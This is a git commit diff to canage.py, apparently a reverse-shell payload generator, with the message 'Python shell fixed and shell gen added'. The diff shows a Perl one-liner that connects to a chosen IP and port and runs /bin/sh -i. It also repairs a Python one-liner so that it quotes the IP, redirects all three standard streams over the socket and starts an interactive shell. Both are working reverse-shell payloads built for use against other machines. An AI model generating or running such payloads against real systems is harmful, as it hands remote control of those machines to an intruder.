099698cf621127f506f88c265357cdefb9752ae0
developer <palani@dev.com>
2019-11-20 23:41:42 +0530

    Python shell fixed and shell gen added

--- canage.py
+++ canage.py
@@ -61,8 +61,10 @@ def perl():
                 script = "perl -e 'use Socket;$i="+ipAddress+";$p="+port+""+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
                 shGen(script)
                 print(script)
+
 def python():           
-                script = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ip+","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);"
+                ipAddress='"'+ip+'"'
+                script = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ipAddress+","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" + 'os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
                 shGen(script)
                 print(script)
 
